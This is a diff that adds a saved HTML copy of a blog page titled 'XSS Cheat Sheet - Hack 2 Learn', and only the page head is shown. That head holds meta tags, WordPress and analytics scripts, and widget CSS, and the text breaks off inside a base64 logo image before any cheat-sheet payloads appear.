@@ -1,0 +1,1766 @@
+<!DOCTYPE html>
+<!-- saved from url=(0042)http://brutelogic.com.br/blog/cheat-sheet/ -->
+<html lang="en-US" prefix="og: http://ogp.me/ns#" class=" js csstransforms csstransforms3d csstransitions"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS Cheat Sheet - Hack 2 Learn</title>
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="http://brutelogic.com.br/blog/xmlrpc.php">
+
+<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
+<link rel="canonical" href="http://brutelogic.com.br/blog/cheat-sheet/">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Cheat Sheet - Hack 2 Learn">
+<meta property="og:description" content="Basic and advanced exploits for XSS proofs and attacks. Work in progress, bookmark it. NOTICE: A special version of this cheat sheet (with private stuff) is available to @brutalsecrets followers here (check pass on timeline). #hack2learn">
+<meta property="og:url" content="http://brutelogic.com.br/blog/cheat-sheet/">
+<meta property="og:site_name" content="Hack 2 Learn">
+<meta property="og:image" content="http://brutelogic.com.br/blog/wp-content/uploads/2016/07/BRUTER-XSS-final.png">
+<meta property="og:image:width" content="457">
+<meta property="og:image:height" content="519">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:description" content="Basic and advanced exploits for XSS proofs and attacks. Work in progress, bookmark it. NOTICE: A special version of this cheat sheet (with private stuff) is available to @brutalsecrets followers here (check pass on timeline). #hack2learn">
+<meta name="twitter:title" content="XSS Cheat Sheet - Hack 2 Learn">
+<meta name="twitter:site" content="@brutelogic">
+<meta name="twitter:image" content="http://i0.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/07/BRUTER-XSS-final.png?fit=457%2C519">
+<meta name="twitter:creator" content="@brutelogic">
+<!-- / Yoast SEO plugin. -->
+
+<link rel="dns-prefetch" href="http://s0.wp.com/">
+<link rel="dns-prefetch" href="http://s.gravatar.com/">
+<link rel="dns-prefetch" href="http://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="http://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="Hack 2 Learn » Feed" href="http://brutelogic.com.br/blog/feed/">
+<link rel="alternate" type="application/rss+xml" title="Hack 2 Learn » Comments Feed" href="http://brutelogic.com.br/blog/comments/feed/">
+		<script src="./XSS Cheat Sheet - Hack 2 Learn_files/cb=gapi.loaded_2" async=""></script><script src="./XSS Cheat Sheet - Hack 2 Learn_files/cb=gapi.loaded_1" async=""></script><script src="./XSS Cheat Sheet - Hack 2 Learn_files/cb=gapi.loaded_0" async=""></script><script type="text/javascript" async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/pinit_main.js"></script><script id="twitter-wjs" src="./XSS Cheat Sheet - Hack 2 Learn_files/widgets.js"></script><script type="text/javascript" async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/platform.js" gapi_processed="true"></script><script type="text/javascript" async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/plusone.js" gapi_processed="true"></script><script id="facebook-jssdk" src="./XSS Cheat Sheet - Hack 2 Learn_files/sdk.js"></script><script async="" src="./XSS Cheat Sheet - Hack 2 Learn_files/analytics.js"></script><script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/brutelogic.com.br\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.6"}};
+			!function(a,b,c){function d(a){var c,d,e,f,g,h=b.createElement("canvas"),i=h.getContext&&h.getContext("2d"),j=String.fromCharCode;if(!i||!i.fillText)return!1;switch(i.textBaseline="top",i.font="600 32px Arial",a){case"flag":return i.fillText(j(55356,56806,55356,56826),0,0),!(h.toDataURL().length<3e3)&&(i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,65039,8205,55356,57096),0,0),c=h.toDataURL(),i.clearRect(0,0,h.width,h.height),i.fillText(j(55356,57331,55356,57096),0,0),d=h.toDataURL(),c!==d);case"diversity":return i.fillText(j(55356,57221),0,0),e=i.getImageData(16,16,1,1).data,f=e[0]+","+e[1]+","+e[2]+","+e[3],i.fillText(j(55356,57221,55356,57343),0,0),e=i.getImageData(16,16,1,1).data,g=e[0]+","+e[1]+","+e[2]+","+e[3],f!==g;case"simple":return i.fillText(j(55357,56835),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode8":return i.fillText(j(55356,57135),0,0),0!==i.getImageData(16,16,1,1).data[0];case"unicode9":return i.fillText(j(55358,56631),0,0),0!==i.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity","unicode9"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="./XSS Cheat Sheet - Hack 2 Learn_files/wp-emoji-release.min.js" type="text/javascript"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="toolbar.css-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/toolbar.css" type="text/css" media="all">
+<link rel="stylesheet" id="style.css-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="es-widget-css-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/es-widget.css" type="text/css" media="all">
+<link rel="stylesheet" id="popup-maker-site-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/site.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="SFSIPLUSmainCss-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/sfsi-style.css" type="text/css" media="all">
+<link rel="stylesheet" id="big-brother-style-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/style(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="big-brother-gentium-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/css" type="text/css" media="all">
+<link rel="stylesheet" id="big-brother-open-sans-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/css(1)" type="text/css" media="all">
+<link rel="stylesheet" id="genericons-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/genericons.css" type="text/css" media="all">
+<link rel="stylesheet" id="recent-posts-widget-with-thumbnails-public-style-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/public.css" type="text/css" media="all">
+<link rel="stylesheet" id="tablepress-default-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/default.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="jetpack_css-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/jetpack.css" type="text/css" media="all">
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/jquery.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/jquery-migrate.min.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/flags.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/toolbar.js"></script>
+<script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/load-toolbar.js"></script>
+<link rel="https://api.w.org/" href="http://brutelogic.com.br/blog/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://brutelogic.com.br/blog/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://brutelogic.com.br/blog/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress 4.6">
+<link rel="shortlink" href="http://wp.me/P7piS6-gL">
+<link rel="alternate" type="application/json+oembed" href="http://brutelogic.com.br/blog/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fbrutelogic.com.br%2Fblog%2Fcheat-sheet%2F">
+<link rel="alternate" type="text/xml+oembed" href="http://brutelogic.com.br/blog/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fbrutelogic.com.br%2Fblog%2Fcheat-sheet%2F&amp;format=xml">
+<style type="text/css">p.hello { font-size:12px; color:darkgray; }#google_language_translator, #flags { text-align:left; }#google_language_translator { clear:both; }#flags { width:165px; }#flags a { display:inline-block; margin-right:2px; }.goog-tooltip {display: none !important;}.goog-tooltip:hover {display: none !important;}.goog-text-highlight {background-color: transparent !important; border: none !important; box-shadow: none !important;}#google_language_translator a {display: none !important; }.goog-te-gadget {color:transparent !important;}.goog-te-gadget { font-size:0px !important; }.goog-branding { display:none; }#google_language_translator {color: transparent;}body { top:0px !important; }</style>    <style id="pum-styles" type="text/css">
+    /* Popup Google Fonts */
+@import url('//fonts.googleapis.com/css?family=Acme|Montserrat');
+
+/* Popup Theme 937: Framed Border */
+.pum-theme-937, .pum-theme-framed-border { background-color: rgba( 255, 255, 255, 0.5 ) } 
+.pum-theme-937 .pum-container, .pum-theme-framed-border .pum-container { padding: 18px; border-radius: 0px; border: 20px outset #dd3333; box-shadow: 1px 1px 3px 0px rgba( 2, 2, 2, 0.97 ) inset; background-color: rgba( 255, 251, 239, 1 ) } 
+.pum-theme-937 .pum-title, .pum-theme-framed-border .pum-title { color: #000000; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: inherit; font-size: 32px; line-height: 36px } 
+.pum-theme-937 .pum-content, .pum-theme-framed-border .pum-content { color: #2d2d2d; font-family: inherit } 
+.pum-theme-937 .pum-content + .pum-close, .pum-theme-framed-border .pum-content + .pum-close { height: 20px; width: 20px; left: auto; right: -20px; bottom: auto; top: -20px; padding: 0px; color: #ffffff; font-family: Acme; font-size: 20px; line-height: 20px; border: 1px none #ffffff; border-radius: 0px; box-shadow: 0px 0px 0px 0px rgba( 2, 2, 2, 0.23 ); text-shadow: 0px 0px 0px rgba( 0, 0, 0, 0.23 ); background-color: rgba( 0, 0, 0, 0.55 ) } 
+/* Popup Theme 936: Cutting Edge */
+.pum-theme-936, .pum-theme-cutting-edge { background-color: rgba( 0, 0, 0, 0.5 ) } 
+.pum-theme-936 .pum-container, .pum-theme-cutting-edge .pum-container { padding: 18px; border-radius: 0px; border: 1px none #000000; box-shadow: 0px 10px 25px 0px rgba( 2, 2, 2, 0.5 ); background-color: rgba( 30, 115, 190, 1 ) } 
+.pum-theme-936 .pum-title, .pum-theme-cutting-edge .pum-title { color: #ffffff; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: Sans-Serif; font-size: 26px; line-height: 28px } 
+.pum-theme-936 .pum-content, .pum-theme-cutting-edge .pum-content { color: #ffffff; font-family: inherit } 
+.pum-theme-936 .pum-content + .pum-close, .pum-theme-cutting-edge .pum-content + .pum-close { height: 24px; width: 24px; left: auto; right: 0px; bottom: auto; top: 0px; padding: 0px; color: #1e73be; font-family: inherit; font-size: 32px; line-height: 24px; border: 1px none #ffffff; border-radius: 0px; box-shadow: -1px 1px 1px 0px rgba( 2, 2, 2, 0.1 ); text-shadow: -1px 1px 1px rgba( 0, 0, 0, 0.1 ); background-color: rgba( 238, 238, 34, 1 ) } 
+/* Popup Theme 935: Hello Box */
+.pum-theme-935, .pum-theme-hello-box { background-color: rgba( 0, 0, 0, 0.75 ) } 
+.pum-theme-935 .pum-container, .pum-theme-hello-box .pum-container { padding: 30px; border-radius: 80px; border: 14px solid #81d742; box-shadow: 0px 0px 0px 0px rgba( 2, 2, 2, 0 ); background-color: rgba( 255, 255, 255, 1 ) } 
+.pum-theme-935 .pum-title, .pum-theme-hello-box .pum-title { color: #2d2d2d; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: Montserrat; font-size: 32px; line-height: 36px } 
+.pum-theme-935 .pum-content, .pum-theme-hello-box .pum-content { color: #2d2d2d; font-family: inherit } 
+.pum-theme-935 .pum-content + .pum-close, .pum-theme-hello-box .pum-content + .pum-close { height: auto; width: auto; left: auto; right: -30px; bottom: auto; top: -30px; padding: 0px; color: #2d2d2d; font-family: inherit; font-size: 32px; line-height: 28px; border: 1px none #ffffff; border-radius: 28px; box-shadow: 0px 0px 0px 0px rgba( 2, 2, 2, 0.23 ); text-shadow: 0px 0px 0px rgba( 0, 0, 0, 0.23 ); background-color: rgba( 255, 255, 255, 1 ) } 
+/* Popup Theme 934: Enterprise Blue */
+.pum-theme-934, .pum-theme-enterprise-blue { background-color: rgba( 0, 0, 0, 0.7 ) } 
+.pum-theme-934 .pum-container, .pum-theme-enterprise-blue .pum-container { padding: 28px; border-radius: 5px; border: 1px none #000000; box-shadow: 0px 10px 25px 4px rgba( 2, 2, 2, 0.5 ); background-color: rgba( 221, 221, 221, 1 ) } 
+.pum-theme-934 .pum-title, .pum-theme-enterprise-blue .pum-title { color: #315b7c; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: inherit; font-size: 8px; line-height: 8px } 
+.pum-theme-934 .pum-content, .pum-theme-enterprise-blue .pum-content { color: #2d2d2d; font-family: inherit } 
+.pum-theme-934 .pum-content + .pum-close, .pum-theme-enterprise-blue .pum-content + .pum-close { height: 28px; width: 28px; left: auto; right: 8px; bottom: auto; top: 8px; padding: 4px; color: #ffffff; font-family: inherit; font-size: 20px; line-height: 20px; border: 1px none #ffffff; border-radius: 42px; box-shadow: 0px 0px 0px 0px rgba( 2, 2, 2, 0.23 ); text-shadow: 0px 0px 0px rgba( 0, 0, 0, 0.23 ); background-color: rgba( 49, 91, 124, 1 ) } 
+/* Popup Theme 933: Light Box */
+.pum-theme-933, .pum-theme-lightbox { background-color: rgba( 0, 0, 0, 0.6 ) } 
+.pum-theme-933 .pum-container, .pum-theme-lightbox .pum-container { padding: 18px; border-radius: 3px; border: 8px solid #000000; box-shadow: 0px 0px 30px 0px rgba( 2, 2, 2, 1 ); background-color: rgba( 255, 255, 255, 1 ) } 
+.pum-theme-933 .pum-title, .pum-theme-lightbox .pum-title { color: #000000; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: inherit; font-size: 32px; line-height: 36px } 
+.pum-theme-933 .pum-content, .pum-theme-lightbox .pum-content { color: #000000; font-family: inherit } 
+.pum-theme-933 .pum-content + .pum-close, .pum-theme-lightbox .pum-content + .pum-close { height: 30px; width: 30px; left: auto; right: -24px; bottom: auto; top: -24px; padding: 0px; color: #ffffff; font-family: inherit; font-size: 24px; line-height: 26px; border: 2px solid #ffffff; border-radius: 30px; box-shadow: 0px 0px 15px 1px rgba( 2, 2, 2, 0.75 ); text-shadow: 0px 0px 0px rgba( 0, 0, 0, 0.23 ); background-color: rgba( 0, 0, 0, 1 ) } 
+/* Popup Theme 932: Default Theme */
+.pum-theme-932, .pum-theme-default-theme { background-color: rgba( 10, 10, 10, 0.5 ) } 
+.pum-theme-932 .pum-container, .pum-theme-default-theme .pum-container { padding: 18px; border-radius: 0px; border: 1px none #000000; box-shadow: 1px 1px 3px 0px rgba( 2, 2, 2, 0.23 ); background-color: rgba( 232, 232, 232, 1 ) } 
+.pum-theme-932 .pum-title, .pum-theme-default-theme .pum-title { color: #000000; text-align: left; text-shadow: 0px 0px 0px rgba( 2, 2, 2, 0.23 ); font-family: inherit; font-size: 8px; line-height: 8px } 
+.pum-theme-932 .pum-content, .pum-theme-default-theme .pum-content { color: #8c8c8c; font-family: inherit } 
+.pum-theme-932 .pum-content + .pum-close, .pum-theme-default-theme .pum-content + .pum-close { height: auto; width: auto; left: auto; right: 0px; bottom: auto; top: 0px; padding: 8px; color: #ffffff; font-family: inherit; font-size: 12px; line-height: 14px; border: 1px none #ffffff; border-radius: 0px; box-shadow: 0px 0px 0px 0px rgba( 2, 2, 2, 0.23 ); text-shadow: 0px 0px 0px rgba( 0, 0, 0, 0.23 ); background-color: rgba( 0, 183, 205, 1 ) } 
+        </style>    	<script>
+			jQuery(document).ready(function(e) {
+                jQuery("body").addClass("sfsi_plus_2.47")
+            });
+			function sfsi_plus_processfurther(ref) {
+				var feed_id = 'Y3RRTFk2Uld0MTBqbmpQT3VNeVNWeE5FWkJ3ak5ITEJCNTl4NVdSYXBzb1M4eVJxQkJiN242Q0g5NHlTWFlKSFg0UUhNUlVMWENrYXMzRURYQ1NEejJzcmVuMGlwNzZuaks0RDBESSt2WHlGSUEvUGFrMmVIUVAvZU5HS1B5Ymt8THV0NlNabUloZ3BhR2pKaWRZa1N1clFUd0JvRnFobHJWcVBPOXpmMnBWST0=';
+				var feedtype = 8;
+				var email = jQuery(ref).find('input[name="data[Widget][email]"]').val();
+				var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+				if ((email != "Enter your email") && (filter.test(email))) {
+					if (feedtype == "8") {
+						var url = "http://www.specificfeeds.com/widgets/subscribeWidget/"+feed_id+"/"+feedtype;
+						window.open(url, "popupwindow", "scrollbars=yes,width=1080,height=760");
+						return true;
+					}
+				} else {
+					alert("Please enter email address");
+					jQuery(ref).find('input[name="data[Widget][email]"]').focus();
+					return false;
+				}
+			}
+		</script>
+    	<style type="text/css" aria-selected="true">
+			.sfsi_plus_subscribe_Popinner
+			{
+								width: 100% !important;
+				height: auto !important;
+												border: 1px solid #b5b5b5 !important;
+								padding: 18px 0px !important;
+				background-color: #ffffff !important;
+			}
+			.sfsi_plus_subscribe_Popinner form
+			{
+				margin: 0 20px !important;
+			}
+			.sfsi_plus_subscribe_Popinner h5
+			{
+				font-family: Helvetica,Arial,sans-serif !important;
+								font-weight: bold !important;
+								color: #000000 !important;
+				font-size: 16px !important;
+				text-align: center !important;
+				margin: 0 0 10px !important;
+    			padding: 0 !important;
+			}
+			.sfsi_plus_subscription_form_field {
+				margin: 5px 0 !important;
+				width: 100% !important;
+				display: inline-flex;
+				display: -webkit-inline-flex;
+			}
+			.sfsi_plus_subscription_form_field input {
+				width: 100% !important;
+				padding: 10px 0px !important;
+			}
+			.sfsi_plus_subscribe_Popinner input[type=email]
+			{
+				font-family: Helvetica,Arial,sans-serif !important;
+								font-style: normal !important;
+								color:  !important;
+				font-size: 14px !important;
+				text-align: center !important;
+			}
+			.sfsi_plus_subscribe_Popinner input[type=email]::-webkit-input-placeholder {
+			   font-family: Helvetica,Arial,sans-serif !important;
+								font-style: normal !important;
+								color:  !important;
+				font-size: 14px !important;
+				text-align: center !important;
+			}
+			
+			.sfsi_plus_subscribe_Popinner input[type=email]:-moz-placeholder { /* Firefox 18- */
+			    font-family: Helvetica,Arial,sans-serif !important;
+								font-style: normal !important;
+								color:  !important;
+				font-size: 14px !important;
+				text-align: center !important;
+			}
+			
+			.sfsi_plus_subscribe_Popinner input[type=email]::-moz-placeholder {  /* Firefox 19+ */
+			    font-family: Helvetica,Arial,sans-serif !important;
+								font-style: normal !important;
+								color:  !important;
+				font-size: 14px !important;
+				text-align: center !important;
+			}
+			
+			.sfsi_plus_subscribe_Popinner input[type=email]:-ms-input-placeholder {  
+			  	font-family: Helvetica,Arial,sans-serif !important;
+								font-style: normal !important;
+								color:  !important;
+				font-size: 14px !important;
+				text-align: center !important;
+			}
+			.sfsi_plus_subscribe_Popinner input[type=submit]
+			{
+				font-family: Helvetica,Arial,sans-serif !important;
+								font-weight: bold !important;
+								color: #000000 !important;
+				font-size: 16px !important;
+				text-align: center !important;
+				background-color: #dedede !important;
+			}
+		</style>
+	<meta name="specificfeeds-verification-code-Y3RRTFk2Uld0MTBqbmpQT3VNeVNWeE5FWkJ3ak5ITEJCNTl4NVdSYXBzb1M4eVJxQkJiN242Q0g5NHlTWFlKSFg0UUhNUlVMWENrYXMzRURYQ1NEejJzcmVuMGlwNzZuaks0RDBESSt2WHlGSUEvUGFrMmVIUVAvZU5HS1B5Ymt8THV0NlNabUloZ3BhR2pKaWRZa1N1clFUd0JvRnFobHJWcVBPOXpmMnBWST0=" content="u5etEGbpcX1ZNGhVxbAF">
+<link rel="dns-prefetch" href="http://v0.wordpress.com/">
+<link rel="dns-prefetch" href="http://i0.wp.com/">
+<link rel="dns-prefetch" href="http://i1.wp.com/">
+<link rel="dns-prefetch" href="http://i2.wp.com/">
+<style type="text/css">img#wpstats{display:none}</style><link rel="icon" href="http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/03/cropped-brute.png?fit=32%2C32" sizes="32x32">
+<link rel="icon" href="http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/03/cropped-brute.png?fit=192%2C192" sizes="192x192">
+<link rel="apple-touch-icon-precomposed" href="http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/03/cropped-brute.png?fit=180%2C180">
+<meta name="msapplication-TileImage" content="http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/03/cropped-brute.png?fit=270%2C270">
+
+<!-- BEGIN GADWP v4.9.3.1 Universal Tracking - https://deconf.com/google-analytics-dashboard-wordpress/ -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-57109305-2', 'auto');
+  ga('send', 'pageview');
+</script>
+
+<!-- END GADWP Universal Tracking -->
+
+
+<link type="text/css" rel="stylesheet" charset="UTF-8" href="./XSS Cheat Sheet - Hack 2 Learn_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./XSS Cheat Sheet - Hack 2 Learn_files/main.js"></script><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="./XSS Cheat Sheet - Hack 2 Learn_files/services.css"><style type="text/css"> .PIN_1471802412739_embed_grid { 
+  width: 100%;
+  max-width: 257px;
+  min-width: 140px;
+  display: inline-block;
+  box-shadow: inset 0 0 1px #000;
+  border-radius: 5px;
+  overflow: hidden;
+  font: 12px "Helvetica Neue", Helvetica, arial, sans-serif;
+  color: rgb(54, 54, 54);
+  box-sizing: border-box;
+  background: #fff;
+  cursor: pointer;
+  -webkit-font-smoothing: antialiased;
+}
+ .PIN_1471802412739_embed_grid * { 
+  display: block;
+  position: relative;
+  font: inherit;
+  cursor: inherit;
+  box-sizing: inherit;
+  margin: 0;
+  padding: 0;
+  text-align: left;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_hd { 
+  height: 55px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_hd .PIN_1471802412739_img { 
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  height: 36px;
+  width: 36px;
+  border-radius: 3px;
+  background: transparent url () 0 0 no-repeat;
+  background-size: cover;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_hd .PIN_1471802412739_pinner { 
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  width: 75%;
+  position: absolute;
+  top: 20px;
+  left: 56px;
+  font-size: 14px;
+  font-weight: bold;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_bd { 
+  padding: 0 10px;
+  -moz-scrollbars: none;
+  -ms-overflow-style: none;
+  overflow-x: hidden;
+  overflow-y: auto;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_bd .PIN_1471802412739_ct { 
+  width: 100%;
+  height: auto;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  display: inline-block;
+  width: 100%;
+  padding: 1px;
+  vertical-align: top;
+  min-width: 60px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col .PIN_1471802412739_img { 
+  margin: 0;
+  display: inline-block;
+  width: 100%;
+  background: transparent url() 0 0 no-repeat;
+  background-size: cover;
+  box-shadow: inset 0 0 1px #000;
+  border-radius: 2px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft { 
+  padding: 11px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button { 
+  border-radius: 3px;
+  text-align: center;
+  box-shadow: inset 0 0 1px #888;
+  background-color: #efefef;
+  position: relative;
+  display: block;
+  overflow: hidden;
+  height: 33px;
+  width: 100%;
+  min-width: 70px;
+  padding: 0 3px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button .PIN_1471802412739_label { 
+  position: absolute;
+  left: 0;
+  width: 100%;
+  text-align: center;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button .PIN_1471802412739_label.PIN_1471802412739_top { 
+  top: 0;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button .PIN_1471802412739_label.PIN_1471802412739_bottom { 
+  bottom: 0;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button .PIN_1471802412739_label .PIN_1471802412739_string { 
+  white-space: pre;
+  color: #746d6a;
+  font-size: 13px;
+  font-weight: bold;
+  vertical-align: top;
+  display: inline-block;
+  height: 33px;
+  line-height: 33px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button .PIN_1471802412739_label .PIN_1471802412739_logo { 
+  display: inline-block;
+  vertical-align: top;
+  height: 33px;
+  width: 65px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMTZweCIgd2lkdGg9IjY0cHgiIHZpZXdCb3g9IjAgMCA2NCAxNiI+PGc+PHBhdGggZD0iTTMzLjIxNSw3LjY2NyBDMzMuODg4LDcuNjY3IDM0LjEyMiw4LjA3NSAzNC4xMjIsOC41NjIgQzM0LjEyMiw5LjM4NiAzMy40ODIsOS44ODkgMzIuNDgxLDkuODg5IEMzMi4xMjQsOS44ODkgMzEuNjI1LDkuODA0IDMxLjMyOSw5LjcwNCBDMzEuNDUyLDguOTQ4IDMxLjk0LDcuNjY3IDMzLjIxNSw3LjY2NyBMMzMuMjE1LDcuNjY3IFogTTQ3LjY2OSw3LjY2NyBDNDguMjg0LDcuNjY3IDQ4LjU3MSw4LjA3NSA0OC41NzEsOC41NjIgQzQ4LjU3MSw5LjM4NiA0Ny45MzYsOS44ODkgNDYuOTMxLDkuODg5IEM0Ni41NzIsOS44ODkgNDYuMDcsOS44MDQgNDUuNzcyLDkuNzA0IEM0NS44OTUsOC45NDggNDYuNDM5LDcuNjY3IDQ3LjY1OSw3LjY2NyBMNDcuNjY5LDcuNjY3IFogTTYyLjkwNiw3LjczNiBDNjMuMTExLDcuNzM2IDYzLjI0NSw3LjY1IDYzLjI4Niw3LjQ1NCBDNjMuMzQ3LDcuMTY2IDYzLjQ3LDYuNjY0IDYzLjUxMSw2LjUzMSBDNjMuNTUyLDYuMzU2IDYzLjQ1LDYuMjIzIDYzLjI1NSw2LjIyMyBMNjEuNzM3LDYuMjIzIEM2MS44NCw1Ljc4MiA2Mi4yNzEsNC4zNjcgNjIuMjcxLDMuNDQ0IEM2Mi4yNzEsMS41OTkgNjAuNzAyLDAuMDMgNTguNDg3LDAuMDMgQzU1Ljk3NSwwLjAzIDU0LjM0NCwxLjcxMSA1NC4zNDQsNC4wOCBDNTQuMzQ0LDQuNzY3IDU0LjYwMSw1LjU3NyA1NC45MTksNi4wNjkgQzU0Ljc4NSw2LjA1OSA1NC42NDIsNi4wNTQgNTQuNTA4LDYuMDU0IEM1Mi42MDEsNi4wNTQgNTEuNDAyLDcuMDkgNTEuNDAyLDguNTkzIEM1MS40MDIsMTAuMDA4IDUyLjUwOSwxMC41NTkgNTMuNTY1LDEwLjkyIEM1NC40ODgsMTEuMjQ5IDU1LjM0OSwxMS40IDU1LjM0OSwxMi4xMiBDNTUuMzQ5LDEyLjYxMiA1NC44NzgsMTIuODk5IDUzLjk1NSwxMi44OTkgQzUyLjg1OCwxMi44OTkgNTIuMjUzLDEyLjM4NyA1Mi4wOTksMTIuMTkyIEM1Mi4yMDEsMTIuMTEgNTIuMzU1LDExLjkxNSA1Mi4zNTUsMTEuNTk1IEM1Mi4zNTUsMTEuMTQ0IDUyLjAzOSwxMC43NzUgNTEuNDQ5LDEwLjc3NSBDNTAuOTQ4LDEwLjc3NSA1MC41MjYsMTEuMT